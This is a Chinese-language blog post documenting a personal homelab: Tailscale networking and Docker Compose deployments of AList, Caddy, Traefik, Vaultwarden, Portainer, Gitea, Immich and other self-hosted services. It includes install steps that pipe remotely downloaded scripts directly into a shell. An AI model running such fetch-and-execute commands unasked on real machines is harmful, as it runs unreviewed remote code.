[{"content":"","date":"2022-12-30","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"2022-12-30","permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker"},{"content":"","date":"2022-12-30","permalink":"/","section":"Lab on Mercury","summary":"","title":"Lab on Mercury"},{"content":"","date":"2022-12-30","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"2022-12-30","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"2022-12-30","permalink":"/tags/%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/","section":"Tags","summary":"","title":"实践记录"},{"content":"最近几天在搭建 Homelab 上花费了不少精力，因此想要一边试错一边记录下这个过程。\n背景 # 最近新购入了一台迷你主机，一半是因为需要一个本地的 x86 架构的环境作为 M1 的补充，一半是因为需要一个长时间运行的 Windows 环境跑一些仅支持 Windows 平台、且对性能有一定要求的服务。为满足后者需求，采用了 Windows 作为物理机系统，用 VirtualBox 启动 Ubuntu 虚拟机以获得 Linux 环境。\n最初接触到 selfhosted service 是因为迷你主机的硬盘空间比较大，放着不用也比较浪费，于是产生了搭建一个私有网盘用来存放和备份文件的想法，可以帮忙减轻手机及笔记本硬盘的压力。随后渐渐发掘了越来越多有趣的 selfhosted service，便开始逐一部署，打造自己的 Homelab。\nOS 主机名 笔记本 macOS Monterey wizard 迷你主机 Windows 11 samurai 虚拟机 Ubuntu Server 22.04 ninja 准备工作 # 网络互通 # 首先需要做好设备之间的网络互通。尽管大部分时间里 wizard 和 samurai 都在同一局域网内，我们仍希望设备之间能够跨局域网通信。这一点可以通过 Tailscale 轻松实现。同时，在设备间传输文件也是十分常见的需求，偷懒起见可以直接利用 Tailscale 各平台客户端内置的 Taildrop。\n需要注意的是，使用 Taildrop 传输文件的设备必须归属于同一 User，因此这些设备上不能打 ACL Tag。不过，User 在 ACL Rules 里面本身也能起到和 Tag 类似的作用。\n值得一提的是，对于只有命令行的 Linux 设备，我们既可以选择复制 tailscale up 返回的链接到其他设备的浏览器里登录，也可以直接使用 Auth Key 在命令行里自动完成登录。通过 Auth Key 加入的设备还可以自动加 Tag，对于批量操作会很有用。\n在将 samurai 和 ninja 都加入到 wizard 所在的网络后，我们就可以连接这两台设备了。对于 samurai，使用 Parsec 连接相比原生 RDP 要快很多。虽然有概率遇到一些问题，但通过官方 FAQ 能很快解决。对于 ninja，用 SSH 连接即可：\nHost ninja HostName ninja User merc IdentityFile ~/.ssh/ninja 得益于 Tailscale 的 MagicDNS，HostName 部分也只需要填写主机名本身。\n相关资料：\nUse Taildrop Use auth keys Mouse and Keyboard Isn\u0026rsquo;t Working Correctly When Connected 初始化与备份 # samurai 的初始化没有太多可提的，可以运行一个 Clash 同时给自己和 ninja 使用（主要是给自己，因为 ninja 使用 wizard 上的代理也很方便），随后用系统还原备份。ninja 则可以使用 dotfiles 仓库自动初始化，并利用 VirtualBox 的系统快照功能备份。\n定时休眠/唤醒 # 由于暂时没有需要 24 小时不停机的服务，为了避免无谓的功耗可以在 samurai 上设置定时休眠与唤醒。休眠同样会影响到 ninja 上的服务，但在唤醒后就会自动恢复。\n在“计算机管理”-“系统工具”-“任务计划程序”中选择“创建任务” 输入任务名称，选择“不管用户是否登录都要运行“和“使用最高权限运行” 在“触发器”选项卡中新建一个触发器，根据触发周期填写 在“操作”选项卡中新建一个操作，选择“启动程序”，程序为 shutdown.exe，参数为 -h，表示休眠 点击“确定”创建任务 重复上述步骤，注意修改触发周期为希望的唤醒时间、修改操作中的程序为 cmd.exe 且无需参数（其他程序亦可），并在“条件”中勾选“唤醒计算机运行此任务” 如果后续需要修改或者临时禁用，可以在“任务计划程序”下的“任务计划程序库”中找到这两个任务。 接下来逐一记录所部署的服务。\n私有网盘 - AList # 私有网盘的解决方案非常多，选择 AList 主要是因为其界面美观、功能丰富同时足够简单、且能挂载公共的网盘服务作为目录。主要用于文件备份和简单的文件管理。\n直接部署 # 最初采用了直接在虚拟机上部署的办法：\n$ curl -fsSL \u0026#34;https://alist.nn.ci/v3.sh\u0026#34; | bash -s install $HOME/alist 这种方法非常方便，暴露的地址类似 http://ninja:5244，可以用 systemd 管理服务。在挂载了本地存储之后，发现 PDF 文件无法预览且文件无法打包下载。两者皆是因为需要 HTTPS 及 CORS 支持。本地存储不存在 CORS 问题，因此只需要开启 HTTPS 即可。\n内网 HTTPS # 由于服务在内网中且不打算开启公网访问，我们无法将正常域名解析到服务器上随后用 Let\u0026rsquo;s Encrypt 等方式获取证书，而使用自签名证书又极不方便，因此可以开启 Tailscale 内置的 HTTPS 支持，能够给组网中的每个设备都分配一个域名及相应的证书，形如 ninja.tailnet-48a5.ts.net。\n这是我目前使用的方案。遗憾的是，这一方案目前还不支持子域名，所以如果要在一台机器上部署多个标准 HTTPS 服务只能采用子目录的形式。但根据之后的经验，并不是所有应用都对子目录的形式有比较好的支持。因此，目前 HTTPS 服务大多数都部署在非标准端口，通过统一的 Dashboard 服务来简化访问。\n回到正题，AList 提供了配置文件可以直接开启 HTTPS：\n{ \u0026#34;force\u0026#34;: false, \u0026#34;address\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;port\u0026#34;: 5244, \u0026#34;site_url\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;cdn\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;jwt_secret\u0026#34;: \u0026#34;******\u0026#34;, \u0026#34;token_expires_in\u0026#34;: 48, \u0026#34;database\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;sqlite3\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;port\u0026#34;: 0, \u0026#34;user\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;db_file\u0026#34;: \u0026#34;data/data.db\u0026#34;, \u0026#34;table_prefix\u0026#34;: \u0026#34;x_\u0026#34;, \u0026#34;ssl_mode\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;scheme\u0026#34;: { \u0026#34;https\u0026#34;: false, \u0026#34;cert_file\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;key_file\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;temp_dir\u0026#34;: \u0026#34;data/temp\u0026#34;, \u0026#34;bleve_dir\u0026#34;: \u0026#34;data/bleve\u0026#34;, \u0026#34;log\u0026#34;: { \u0026#34;enable\u0026#34;: true, \u0026#34;name\u0026#34;: \u0026#34;data/log/log.log\u0026#34;, \u0026#34;max_size\u0026#34;: 10, \u0026#34;max_backups\u0026#34;: 5, \u0026#34;max_age\u0026#34;: 28, \u0026#34;compress\u0026#34;: false }, \u0026#34;max_connections\u0026#34;: 0 } 只需要设置 scheme 字段就可以启动 HTTPS 服务器，但需要注意设置 site_url 为网站实际的 URL，如 https://ninja.tailnet-48a5.ts.net:5244。\n修改运行权限 # 到这里就可以正常使用 AList 了，但容易发现在 AList 界面中创建的文件、甚至包括 AList 自身的配置文件都属于 root 用户，在 Linux 的 shell 里需要 sudo 或 chown 才能访问和修改。这是 AList 默认以 root 权限运行导致的。\n为了修改其运行权限，我们可以在 systemd 中创建一个用户的 service，但为了更强的隔离性和可维护性，使用 Docker 部署而不是裸机部署是更好的做法。而为了方便管理 Docker 容器以及其相应的启动参数、环境变量、Volume 和 Network 等信息，我们选择采用 Docker Compose 来持久化容器配置。\nDocker Compose 部署 # 此时编写的 Docker Compose 文件如下，使用了 PUID 和 PGID 环境变量让 AList 以当前用户 1000:1000 的身份运行，UMASK 控制其操作的文件权限为 755。同时将容器的 5244 端口映射到宿主机的 443 端口，只需要访问 https://ninja.tailnet-48a5.ts.net 即可。\nversion: \u0026#34;3\u0026#34; services: alist: image: xhofe/alist:latest container_name: alist restart: always environment: - PUID=1000 - PGID=1000 - UMASK=022 volumes: - $PWD/data:/opt/alist/data - $HOME/files:/opt/alist/files ports: - 443:5244 备份 # 在管理界面自带配置备份功能，生成的 JSON 文件上传到云端保存\n文件备份则借助 VirtualBox 的系统快照以及加密上传到云盘实现，其中部分常用文件通过下文提到的 Syncthing 在多设备间同步\n所有 docker compose 文件放在同一目录 compose 内统一上传到云端保存，下文服务同理\n已知问题 # 移动设备上不能同时选择多个文件上传 移动设备上使用火狐浏览器上传文件会覆盖掉整个所处的目录 同类服务 # Cloudreve Seafile Pydio ownCloud 相关资料：\nAList 官方文档 Enabling HTTPS 反向代理 - Caddy v2 # 完成 AList 部署后，我发现在同一台设备上可能还需要部署其他服务，此时使用反向代理会极大地方便我们统一管理不同服务。由于传统的 Nginx、Apache 配置语法比较繁杂，我更倾向于使用一些新的反向代理软件。在调研过程中，发现 Traefik 的文档以及冗长的 yaml 语法都感觉不是太友好，而 Nginx Proxy Manager 虽然配置非常简单，但只支持子域名和子路径两种形式，要想使用非标准端口号则仍需要手写 Nginx 配置文件，退化为了 Nginx。最终，Caddy 清晰简洁的语法吸引了我。\n直接部署 # 最初同样采用了在虚拟机上直接部署的方法：\n$ sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https $ curl -1sLf \u0026#39;https://dl.cloudsmith.io/public/caddy/stable/gpg.key\u0026#39; | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg $ curl -1sLf \u0026#39;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt\u0026#39; | sudo tee /etc/apt/sources.list.d/caddy-stable.list $ sudo apt update $ sudo apt install caddy 我们可以直接在命令行中运行 caddy [command] [args]，提供的 run、start、stop、reload 等命令体感上比 systemd 更好用。\n配置文件 # 以反向代理 Alist 服务为例，我们先将 AList 的端口映射到 127.0.0.1:5244，并关闭 AList 内置的 HTTPS 支持，因为此时暴露服务和 HTTPS 都将交给反向代理完成：\nversion: \u0026#34;3\u0026#34; services: alist: # ... ports: - 127.0.0.1:5244:5244 Caddy 的语法极为简洁，如果使用 Caddyfile，实现反向代理只需要短短三行：\nninja.tailnet-48a5.ts.net reverse_proxy localhost:5244 随后，我们使用 Tailscale 的证书实现 HTTPS 支持：\nninja.tailnet-48a5.ts.net { tls /etc/caddy/certs/ninja.tailnet-48a5.ts.net.crt /etc/caddy/certs/ninja.tailnet-48a5.ts.net.key reverse_proxy localhost:5244 } Caddy 实际上可以自动申请证书，但由于上文提到的内网部署的原因没有使用这一特性。\n由于其他服务也需要使用这一 TLS 配置，可以将其封装为 snippet：\n(tls) { tls /etc/caddy/certs/ninja.tailnet-48a5.ts.net.crt /etc/caddy/certs/ninja.tailnet-48a5.ts.net.key } ninja.tailnet-48a5.ts.net { import tls reverse_proxy localhost:5244 } 此时的架构如下图：\n可以看到，流量从 ninja 的 443 端口进入后被反向代理到 127.0.0.1:5244，随后通过端口映射被转发到容器的 5244 端口。这样做能行得通，但也意味着每增加一个服务，宿主机 ninja 上除了 Caddy 监听的端口外就需要多监听至少一个端口，尽管是本地监听。这样多占用一个端口仅仅是为了让宿主机上的普通进程 Caddy 能访问容器开放的端口，没有任何实际的好处。\nDocker Compose 部署 # 因此，我们希望容器端口只暴露在容器网络内部而不影响宿主机，同时需要让反向代理能够访问到这些端口。那么，只需要让反向代理也容器化，并和服务容器的网络打通就可以了。简单起见，我们可以直接将 Caddy 容器加入 AList 所在的网络中。\n首先修改 AList 的 docker-compose.yml，使其加入 lab 网络：\nversion: \u0026#34;3\u0026#34; services: alist: image: xhofe/alist:latest container_name: alist restart: always environment: - PUID=1000 - PGID=1000 - UMASK=022 volumes: - $PWD/data:/opt/alist/data - $HOME/files:/opt/alist/files networks: default: external: true name: lab 在此之前，我们已经 docker create network lab 了。注意此时不再需要映射端口。然后创建 Caddy 容器：\nversion: \u0026#34;3\u0026#34; services: caddy: image: caddy:latest container_name: caddy restart: always volumes: - $PWD/Caddyfile:/etc/caddy/Caddyfile - $HOME/certs:/etc/caddy/certs:ro - caddy_data:/data - caddy_config:/config ports: - 443:443 networks: default: external: true name: lab volumes: caddy_data: caddy_config: 我们并没有将挂载的 Caddyfile 也设为只读，因为有时可以利用 caddy fmt --overwrite 来格式化 Caddyfile。\n最后修改反向代理的上游服务，由于 Caddy 容器与 AList 容器在同一网络内，可以通过 service 名称来互相访问：\nninja.tailnet-48a5.ts.net { import tls reverse_proxy alist:5244 } 重载 Caddy:\n$ docker exec -w /etc/caddy caddy caddy reload 这时的架构图就变成了：\n备份 # 将 Caddyfile 放在 compose/caddy 目录下一同备份 如有必要，可以备份 Docker Volume 已知问题 # 有时会因为缓存导致 caddy reload 的更新不及时，可以用 caddy stop \u0026amp;\u0026amp; caddy start 解决 同类服务 # Nginx Apache Nginx Proxy Manager Traefik（见下文） Envoy HAProxy 相关资料：\nCaddy v2 官方文档 Best Practice: Use a Docker network 密码管理 - Vaultwarden # Vaultwarden 相比 Bitwarden 官方镜像占用资源更少，并且支持大部分 Bitwarden API，对我而言足够了。主要用作密码库，同时存储了一些密码之外的敏感信息，配合 Bitwarden 浏览器扩展使用。\nDocker Compose 部署 # 部署过程非常丝滑，没有遇到任何问题：\nversion: \u0026#34;3\u0026#34; services: vaultwarden: image: vaultwarden/server:latest container_name: vaultwarden restart: always volumes: - vaultwarden:/data networks: default: external: true name: lab volumes: vaultwarden: 从这里开始，对于不怎么修改的挂载目录会尽量使用 单独的 Docker Volume 挂载。\n反向代理 # 对外暴露的端口可以任意修改，下文服务同理。\nninja.tailnet-48a5.ts.net:8443 { import tls reverse_proxy vaultwarden:80 } 备份 # “工具”-“导出密码库”-“.json(Encrypted)”，选择加密是因为要上传云端 如有必要，可以备份 Docker Volume 同类服务 # Bitwarden Enpass KeePass 相关资料：\nVaultwarden Wiki Docker 管理 - Portainer # 使用 Portainer 的 GUI 界面可以更方便地批量管理 Docker 镜像、容器、Volume、Network 等资源。\nDocker Compose 部署 # 我们可以将 /var/run/docker.sock 设为只读挂载，这不会影响容器对 Docker Socket 的读写操作，所以几乎所有情况下我们都应该这么做。但需要注意，由于 /var/run/docker.sock 属于 root 用户，挂载后的容器等于拥有了 root 权限，会引入一定安全风险。\nversion: \u0026#34;3\u0026#34; services: portainer: image: portainer/portainer-ce:latest container_name: portainer restart: always volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - portainer:/data networks: default: external: true name: lab volumes: portainer: 备份 # “Settings”-“Backup Portainer” 可以备份配置文件，同样建议开启密码保护 如有必要，可以备份 Docker Volume 同类服务 # Yacht 相关资料：\nPortainer 官方文档 Does binding the docker socket in read-only mode affect how Traefik works? What is the Docker security risk of /var/run/docker.sock? 服务存活状态监控 - Uptime Kuma # Uptime Kuma 是 Uptime Robot 的私有部署替代品，用来监控我在公网和内网部署的各种服务的存活状态并自动告警。\nDocker Compose 部署 # version: \u0026#34;3\u0026#34; services: uptime-kuma: image: louislam/uptime-kuma:latest container_name: uptime-kuma restart: always volumes: - uptime-kuma:/app/data networks: default: external: true name: lab volumes: uptime-kuma: Uptime Kuma 提供了 Telegram Bot 自动告警的功能，但 ninja 位于墙内无法直接访问 Telegram API。除了网络层代理外，另一个简单的方法是利用 Cloudflare Workers 反向代理 Telegram API。\nCloudflare Workers 反代 Telegram API # 这种方法需要有一个托管在 Cloudflare 的域名，并解析一条 A 记录到 2.2.2.2，可以使用子域名。接着在账户下的 Workers 中创建一个”HTTP 路由器“，并进行快速编辑：\nconst whitelist = [\u0026#34;/bot1111111111:\u0026#34;]; const tg_host = \u0026#34;api.telegram.org\u0026#34;; addEventListener(\u0026#39;fetch\u0026#39;, event =\u0026gt; { event.respondWith(handleRequest(event.request)) }) function validate(path) { for (var i = 0; i \u0026lt; whitelist.length; i++) { if (path.startsWith(whitelist[i])) return true; } return false; } async function handleRequest(request) { var u = new URL(request.url); u.host = tg_host; if (!validate(u.pathname)) return new Response(\u0026#39;Unauthorized\u0026#39;, { status: 403 }); var req = new Request(u, { method: request.method, headers: request.headers, body: request.body }); const result = await fetch(req); return result; } 注意将白名单中的数字替换为自己的 Telegram Bot Token 中的数字部分，然后就可以部署了。\n随后在域名下的 Workers 中添加 HTTP 路由，使用刚才解析的子域名作为路由，如 tg.example.org/*，并使用刚才创建的服务和 production 环境。此时我们就可以通过访问 tg.example.org 从而访问到 api.telegram.org 了。\n最后将 Uptime Kuma 容器中对 api.telegram.org 的请求地址替换为 tg.example.org：\n$ docker exec -it uptime-kuma /bin/sh $ sed -i \u0026#39;s/api.telegram.org/tg.example.org/g\u0026#39; /app/src/components/notifications/Telegram.vue $ sed -i \u0026#39;s/api.telegram.org/tg.example.org/g\u0026#39; /app/server/notification-providers/telegram.js 重启容器后生效。\n备份 # “设置”-“备份”中可以进行配置备份 如有必要，可以备份 Docker Volume 同类服务 # Healthchecks\nStatping-ng\n相关资料：\nUptime Kuma Wiki\n搭建uptime-kuma及Ward服务监控面板\n文件多设备同步 - Syncthing # Syncthing 可以在多个设备之间同步文件。因为部分常用文件经常需要在多个设备上都使用且保持最新状态，目前主要用于对常用文件的备份，作为私有网盘的补充。\nDocker Compose 部署 # 这里需要注意的设置主要是运行的用户权限，以及是否给 Syncthing 赋予修改文件 owner 的权限。由于是用作私有网盘的补充，这里仅挂载了 AList 本地存储的根目录，实际上任何挂载到 /var/syncthing 下的文件都能被同步。\nversion: \u0026#34;3\u0026#34; services: syncthing: image: syncthing/syncthing:latest container_name: syncthing hostname: ninja restart: always environment: - PUID=1000 - PGID=1000 - PCAP=cap_chown,cap_fowner+ep volumes: - $HOME/files:/var/syncthing networks: default: external: true name: lab 反向代理 # 由于 Syncthing 会检查 Host Header，在使用反向代理时需要设置 Host 和上游服务相同：\nninja.tailnet-48a5.ts.net:5443 { import tls reverse_proxy syncthing:8384 { header_up host {upstream_hostport} } } 备份 # 配置备份：$HOME/files/config（容器内路径：/var/syncthing/config） 实际上，Syncthing 所同步的目录的列表不需要额外备份，因为 Syncthing 通常运行在多个设备上，因此可以从其他设备恢复同步的目录列表 同类服务 # Resilio Sync 相关资料：\nSyncthing 官方文档 私有 Git 仓库 - Gitea # 为了存放不便公开的代码以及部分旧代码，可以用 Gitea 建立一个私有的 Git 仓库以实现对这些代码进行版本控制的需求。\nDocker Compose 部署 # 这里使用 1 这个 tag 来指定稳定版镜像，然后直接暴露宿主机 2222 端口作为 SSH 端口，不经过反向代理。需要注意 SSH_PORT 是在 clone 链接中显示的端口（也就是宿主机暴露的 SSH 端口），而 SSH_LISTEN_PORT 才是容器监听的 SSH 端口。\nversion: \u0026#34;3\u0026#34; services: gitea: image: gitea/gitea:1 container_name: gitea restart: always environment: - DOMAIN=ninja.tailnet-48a5.ts.net - SSH_DOMAIN=ninja.tailnet-48a5.ts.net - SSH_PORT=2222 - SSH_LISTEN_PORT=22 - DISABLE_REGISTRATION=true volumes: - gitea:/data - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro ports: - 2222:22 networks: default: external: true name: lab volumes: gitea: SSH 配置 # Gitea 安装完成后，一个正常的 SSH clone URL 类似 ssh://git@ninja.tailnet-48a5.ts.net:2222/\u0026lt;user\u0026gt;/\u0026lt;repo\u0026gt;.git，如果要用命令行 clone 的话还需要 -i 指定私钥，我们可以通过 SSH Config 简化这一步。\n生成密钥对和添加公钥的方法和 GitHub 一致，用户也同样是 git，需要注意的是正确设置 HostName 和 Port：\nHost gitea HostName ninja.tailnet-48a5.ts.net Port 2222 User git IdentityFile ~/.ssh/gitea 配置完成后，只需要使用 ssh://gitea/\u0026lt;user\u0026gt;/\u0026lt;repo\u0026gt;.git 这样的 URL 即可。\n备份 # 在容器中执行 su git -\u0026gt; ./gitea dump 目前恢复较为复杂，详见 备份与恢复 同类服务 # Gitlab Gogs 相关资料：\nGitea 官方文档 Homelab 仪表盘 - Homepage # 由于已经部署了许多服务且采用了 URL 不太友好的非标准端口号方式，我们可以自建一个服务导航面板 Homepage，同时简单监控机器资源及服务状态。\nDocker Compose 部署 # Homepage 的配置文件中可以直接引用 Dashboard Icons 的图标，但部署的部分服务的图标没有适配，因此挂载了 /app/public/icons 补充图标：\nversion: \u0026#34;3\u0026#34; services: homepage: image: ghcr.io/benphelps/homepage:latest container_name: homepage restart: always volumes: - $PWD/config:/app/config:ro - $PWD/icons:/app/public/icons:ro - /var/run/docker.sock:/var/run/docker.sock：ro networks: default: external: true name: lab 图标显示问题 # 搭建并配置完成后，在笔记本上访问由于可以开启 Tailscale + 梯子两个 VPN，并没有什么问题；但在移动设备上由于同一时间只能开启一个 VPN，通过 Tailscale 访问时出现了大量图标无法显示的问题，这是因为 cdn.jsdelivr.net 被墙了。解决方法也很简单，将这些图标文件也放到本地的 icons 目录。\n跨域访问 Portainer API # Homepage 提供了 Portainer 相关的 Widgets，在 Portainer 界面生成 Access Token 贴到配置中即可使用。但在实际使用中发现会遇到跨域问题，我们可以通过反向代理给 Portainer 服务添加 Access-Control 系列 Headers 来解决。\n在 Caddy v2 中，我们可以 CORS 相关功能封装为 snippet：\n(cors) { @origin{args.0} header Origin {args.0} header @origin{args.0} Access-Control-Allow-Origin \u0026#34;{args.0}\u0026#34; header @origin{args.0} Access-Control-Allow-Headers \u0026#34;content-type, x-requested-with, x-api-key\u0026#34; header Access-Control-Allow-Methods \u0026#34;POST, GET, OPTIONS\u0026#34; header @origin{args.0} Vary Origin @options { method OPTIONS } respond @options 204 } 这里的 Access-Control-Allow-Headers 可以根据需要添加，例如 x-api-key。而 {args.0} 表示该 snippet 的第一个参数，在这里是我们想要允许的 Origin，可以这样使用：\n(cors-allow-homepage) { import cors https://ninja.tailnet-48a5.ts.net:6443 } ninja.tailnet-48a5.ts.net:9443 { import tls import cors-allow-homepage reverse_proxy portainer:9000 } ninja.tailnet-48a5.ts.net:6443 { import tls reverse_proxy homepage:3000 } 备份 # 配置备份：在 compose 备份中完成 同类服务 # Homer Heimdall Dashy 相关资料：\nHomepage 官方文档 代码编辑 - Code Server # 可在浏览器中访问的 VSCode，可以在 iPad 等设备上替代 Remote-SSH 方案。\nDocker Compose 部署 # 一开始因为想要全部服务容器化，也用容器来部署：\nversion: \u0026#34;3\u0026#34; services: code-server: image: codercom/code-server:latest container_name: code-server restart: always user: 1000:1000 volumes: - $HOME/.config:/home/coder/.config - $HOME:/home/coder networks: default: external: true name: lab 但很快就发现容器内使用宿主机上的程序和环境（例如 zsh、Go、Node、Python）会很麻烦，等于还要重新初始化一遍。因此唯独这个服务进行了直接部署。\n直接部署 # $ curl -fsSL https://code-server.dev/install.sh | sh 之后就可以通过 systemd 来管理了。但由于此时使用的是主机网络而非容器网络 lab，Caddy 无法直接访问到 Code Server 服务。借此机会，我尝试了使用容器反向代理 Traefik 替换 Caddy 反代之前的所有服务，随后让 Caddy 运行在 Host Network 上单独反代 Code Server。最后的 Caddyfile 如下：\n(tls) { tls /etc/caddy/certs/ninja.tailnet-48a5.ts.net.crt /etc/caddy/certs/ninja.tailnet-48a5.ts.net.key } # code-server ninja.tailnet-48a5.ts.net:1337 { import tls reverse_proxy 127.0.0.1:8080 } 已知问题 # 无法使用官方插件市场，因此没有 Remote 系列插件（其他常用插件基本可用） 备份 # 唯一需要备份的 settings.json 通常会有一份在我们本地，可以考虑放一份在云端 同类服务 # OpenVSCode Server VS Code Server 相关资料：\nCode Server 官方文档 容器反向代理 - Traefik v2 # Traefik 是专为容器设计的反向代理，主要通过 Docker Compose 文件中的 labels 进行配置。\nDocker Compose 部署 # 暴露需要暴露的端口，并挂载证书、静态配置文件、动态配置文件、Docker Socket：\nversion: \u0026#34;3\u0026#34; services: traefik: image: traefik:v2.9 container_name: traefik restart: always volumes: - $HOME/certs:/etc/certs:ro - $PWD/traefik.yml:/etc/traefik/traefik.yml:ro - $PWD/certs-traefik.yml:/etc/traefik/dynamic/certs-traefik.yml:ro - /var/run/docker.sock:/var/run/docker.sock:ro ports: - 8081:8080 - 443:443 - 3443:3443 - 4443:4443 - 5443:5443 - 6443:6443 - 7443:7443 - 8443:8443 - 9443:9443 networks: default: external: true name: lab 其中静态配置如下：\nglobal: sendAnonymousUsage: false log: filePath: /data/traefik.log level: WARN accessLog: filePath: /data/access.log bufferingSize: 100 filters: statusCodes: - \u0026#34;400-499\u0026#34; - \u0026#34;500-599\u0026#34; api: insecure: true providers: docker: endpoint: \u0026#34;unix:///var/run/docker.sock\u0026#34; exposedByDefault: false network: lab file: directory: /etc/traefik/dynamic entryPoints: alist: address: :443 http: tls: true # ... 首先是一些常规的日志设置，并允许通过 HTTP 访问 Dashboard 我们不需要自动暴露每一个 Docker 容器，因此设置 exposedByDefault： false 我们显式声明了使用 lab 网络，是因为如果一个容器处于多个网络中，Traefik 无法知道要转发到它的哪个网卡上（下文设置的 Immich 服务提供了一个很好的例子） 然后利用 File Provider 加载挂载的动态配置文件 最后为每个服务创建对应的 Entrypoints 并默认开启 TLS。 如果修改了静态配置，需要重启 Traefik 容器才能生效；动态配置部分，File Provider 用来配置了证书：\ntls: certificates: - certFile: /etc/certs/ninja.tailnet-48a5.ts.net.crt keyFile: /etc/certs/ninja.tailnet-48a5.ts.net.key Docker Provider 的动态配置都在各个 Docker Compose 文件中，对其进行修改不需要重启 Traefik 容器，但需要重启对应的服务容器。\n反向代理服务 # 设置完成后，就可以对之前那些服务的 Docker Compose 文件添加 labels 来实现反代了，依然以 AList 为例，其他服务同理：\nversion: \u0026#34;3\u0026#34; services: alist: # ... labels: - traefik.enable=true - traefik.http.routers.alist.rule=Host(`ninja.tailnet-48a5.ts.net`) - traefik.http.routers.alist.entrypoints=alist - traefik.http.services.alist.loadbalancer.server.port=5244 # ... 其中 traefik.http.services.\u0026lt;service_name\u0026gt;.loadbalancer.server.port 会告诉 Traefik 上游服务的端口。如果服务本身只开放了一个端口，那么可以不用设置 ，但为了格式统一这里都进行了显式设置。\n反向代理 Traefik Dashboard # 之前是通过 HTTP 8081 端口访问的 Traefik Dashboard，而我们希望通过 Traefik 反代将这个服务也升级到 HTTPS。方法和其他服务是类似的，不过需要注意 service 为 api@internal（在 Dashboard 中可以看到）、不再暴露 HTTP 端口、暴露新的 HTTPS 端口：\nversion: \u0026#34;3\u0026#34; services: traefik: # ... ports: - 443:443 - 2443:2443 - 3443:3443 - 4443:4443 - 5443:5443 - 6443:6443 - 7443:7443 - 8443:8443 - 9443:9443 labels: - traefik.enable=true - traefik.http.routers.traefik.rule=Host(`ninja.tailnet-48a5.ts.net`) - traefik.http.routers.traefik.entrypoints=traefik - traefik.http.routers.traefik.service=api@internal # ... 备份 # 配置备份：动态配置和静态配置的 YAML 文件，都在 compose 备份中完成 同类服务 # 见上文 Caddy v2 - 同类服务 部分。 相关资料：\nTraefik 官方文档 Use Your Own Certificates with Traefik 照片管理 - Immich # Immich 主要用于同步手机照片以及方便在各个客户端浏览，作为私有网盘在照片方面的补充。\nDocker Compose 部署 # 使用了官方提供的 docker-compose.yml，去掉了 AI 相关的服务：\nversion: \u0026#34;3\u0026#34; services: immich-server: image: altran1502/immich-server:release entrypoint: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;./start-server.sh\u0026#34;] volumes: - ${UPLOAD_LOCATION}:/usr/src/app/upload env_file: - .env environment: - NODE_ENV=production depends_on: - redis - database restart: always immich-microservices: image: altran1502/immich-server:release entrypoint: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;./start-microservices.sh\u0026#34;] volumes: - ${UPLOAD_LOCATION}:/usr/src/app/upload env_file: - .env environment: - NODE_ENV=production depends_on: - redis - database restart: always immich-web: image: altran1502/immich-web:release entrypoint: [\u0026#34;/bin/sh\u0026#34;, \u0026#34;./entrypoint.sh\u0026#34;] env_file: - .env environment: # Rename these values for svelte public interface - PUBLIC_IMMICH_SERVER_URL=${IMMICH_SERVER_URL} restart: always redis: container_name: immich_redis image: redis:6.2 restart: always database: container_name: immich_postgres image: postgres:14 env_file: - .env environment: POSTGRES_PASSWORD: ${DB_PASSWORD} POSTGRES_USER: ${DB_USERNAME} POSTGRES_DB: ${DB_DATABASE_NAME} PG_DATA: /var/lib/postgresql/data volumes: - pgdata:/var/lib/postgresql/data restart: always immich-proxy: container_name: immich_proxy image: altran1502/immich-proxy:release environment: # Make sure these values get passed through from the env file - IMMICH_SERVER_URL - IMMICH_WEB_URL logging: driver: none depends_on: - immich-server restart: always networks: default: external: true name: lab volumes: pgdata: 其中 immich-web 为前端，immich-server 为后端，与 database 和 redis 交互；immich-microservices 负责执行批量任务（如果有 AI 服务则会通过“识别”类任务与 AI 服务交互）；immich-proxy 负责暴露 immich-web 和 immich-server 两个服务。\n用反向代理替代 immich-proxy # 因为我们已经使用了反向代理，所以 immich-proxy 这个 nginx 容器就显得比较多余了，我们希望直接用 Traefik 替代它。\n经过研究可以发现 immich-proxy 做的事情本质上就是：\n将 /api 的请求发送到 immich-server:3001，并重写路径为 / 将 / 的请求发送到 immich-web:3000 用 Caddyfile 表示这个过程，就是：\nninja.tailnet-48a5.ts.net:7443 { handle_path /api/* { reverse_proxy immich-server:3001 } handle { reverse_proxy immich-web:3000 } } 而用 Traefik 实现则需要修改 Docker Compose 文件，首先注释掉 immich-proxy 服务，对于 immich-server，我们匹配路径前缀 /api，然后创建 strip-api 的中间件将 /api 重写为 /，最后转发到上游 immich-server:3001：\nservices: immich-server: # ... labels: - traefik.enable=true - traefik.http.routers.immich-server.rule=Host(`ninja.tailnet-48a5.ts.net`) \u0026amp;\u0026amp; PathPrefix(`/api`) - traefik.http.routers.immich-server.middlewares=strip-api - traefik.http.middlewares.strip-api.stripprefix.prefixes=/api - traefik.http.routers.immich-server.entrypoints=immich - traefik.http.services.immich-server.loadbalancer.server.port=3001 对于 immich-web，注意需要使用一个新的 Router immich-web，但最终的 Entrypoints 还是使用 immich，也就是我们最终访问的 :7443 URL。其他设置和常规服务相同，转发到上游 immich-web:3000：\nservices: # ... 